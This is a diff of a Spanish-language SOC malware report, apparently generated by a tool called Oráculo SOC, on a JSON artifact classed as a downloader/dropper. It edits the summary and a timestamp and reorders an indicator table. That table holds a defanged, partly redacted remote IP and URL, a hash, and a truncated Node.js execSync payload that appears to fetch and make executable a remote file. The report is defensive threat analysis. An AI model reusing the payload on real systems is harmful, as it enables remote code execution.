@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.
+Artefacto identificado como JSON text data de 896 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `cumshotnews` en `hxxp://192.142.28.XXX/cumshotnews`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:23:38+00:00`
+- **Registrado:** `2026-08-09T20:23:38.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -47,11 +48,11 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 192.142.28.XXX | static_analysis |
 | url | hxxp://192.142.28.XXX/cumshotnews;chmod | strings |
 | url | hxxp://192.142.28.XXX/cumshotnews;curl | strings |
-| hash | 503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4 | static_analysis |
+| ip | 192.142.28.XXX | static_analysis |
 | command | {"params":{"script":{"code":"const cp = require(\"child_process\");try{const r=cp.execSync(\"cd /tmp\|\|cd /var/run\|\|cd /m | strings |
+| hash | 503b82ae05653b546ab03052c63b1648c65dd406dfad2155156a34b53f02aac4 | static_analysis |
 
 ## 🔎 Triage
 
